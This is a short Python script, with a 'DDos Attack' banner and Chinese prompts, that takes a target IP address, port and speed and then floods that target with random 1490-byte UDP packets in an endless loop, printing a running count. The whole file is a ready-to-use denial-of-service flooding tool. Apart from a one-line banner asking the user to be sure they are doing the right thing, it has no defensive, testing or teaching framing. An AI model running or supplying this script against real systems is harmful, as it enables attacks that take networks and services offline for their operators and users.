# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/----------------------------------------------------------------\ ")
print ("| Testing:  Blackarch                                            |")
print ("| github : https://github.com/Ha3MrX/DDos-Attack                 |")
print ("| 文件来自: https://github.com/gituser88-cloud/DDos-Attack.git   |")
print ("| 有剑不用和没剑在手不一样...                                    |")
print ("|醉里挑灯看剑，梦回吹角连营.....                                 | " )
print ("\----------------------------------------------------------------/")
print (" ")
print (" -----------------[请确认您在做正确的事！！！]------------------- ")
print (" ")
ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))
sd = int(input("攻击速度(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)

